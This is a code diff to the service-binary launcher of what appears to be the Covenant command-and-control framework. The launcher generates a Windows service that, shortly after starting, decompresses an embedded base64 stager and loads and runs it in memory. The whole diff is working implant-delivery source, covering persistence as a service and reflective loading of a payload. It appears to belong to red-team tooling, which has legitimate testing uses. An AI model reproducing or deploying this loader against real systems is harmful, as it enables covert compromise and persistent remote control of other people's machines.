@@ -12,7 +12,7 @@ using Covenant.Models.Listeners;
 
 namespace Covenant.Models.Launchers
 {
-    public class ServiceBinaryLauncher : DiskLauncher
+    public class ServiceBinaryLauncher : Launcher
     {
         public ServiceBinaryLauncher()
         {
@@ -26,9 +26,9 @@ namespace Covenant.Models.Launchers
         public override string GetLauncher(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template)
         {
             this.StagerCode = StagerCode;
-            this.Base64ILByteString = Convert.ToBase64String(StagerAssembly);
+            string stager = Convert.ToBase64String(StagerAssembly);
             
-            var code = CodeTemplate.Replace("{{GRUNT_IL_BYTE_STRING}}", this.Base64ILByteString);
+            string code = CodeTemplate.Replace("{{GRUNT_IL_BYTE_STRING}}", stager);
             
             var references = grunt.DotNetVersion == Common.DotNetVersion.Net35 ? Common.DefaultNet35References : Common.DefaultNet40References;
             references.Add(new Compiler.Reference
@@ -38,7 +38,7 @@ namespace Covenant.Models.Launchers
                 Enabled = true
             });
 
-            this.DiskCode = Convert.ToBase64String(Compiler.Compile(new Compiler.CsharpFrameworkCompilationRequest
+            this.Base64ILByteString = Convert.ToBase64String(Compiler.Compile(new Compiler.CsharpFrameworkCompilationRequest
             {
                 Language = template.Language,
                 Source = code,
@@ -61,10 +61,7 @@ namespace Covenant.Models.Launchers
                 this.LauncherString = hostedFile.Path.Split("\\").Last().Split("/").Last();
                 return location.ToString();
             }
-            else
-            {
-                return "";
-            }
+            return "";
         }
 
         private static readonly string CodeTemplate =
@@ -73,7 +70,7 @@ using System.IO;
 using System.IO.Compression;
 using System.Reflection;
 using System.ServiceProcess;
-using System.Threading;
+using System.Timers;
 
 namespace Grunt
 {
@@ -96,6 +93,14 @@ namespace Grunt
 
         protected override void OnStart(string[] args)
         {
+            Timer timer = new Timer(10);
+            timer.Elapsed += new ElapsedEventHandler(Go);
+            timer.AutoReset = false;
+            timer.Start();
+        }
+
+        private void Go(object source, ElapsedEventArgs e)
+        {
             var oms = new MemoryStream();
             var ds = new DeflateStream(new MemoryStream(Convert.FromBase64String(""{{GRUNT_IL_BYTE_STRING}}"")), CompressionMode.Decompress);
             var by = new byte[1024];
@@ -107,13 +112,11 @@ namespace Grunt
                 r = ds.Read(by, 0, 1024);
             }
 
-            new Thread(delegate()
+            new System.Threading.Thread(delegate()
             {
                 Assembly.Load(oms.ToArray()).EntryPoint.Invoke(0, new object[] { new string[] { } });
             }).Start();   
         }
-
-        protected override void OnStop() {}
     }
 
     partial class Service
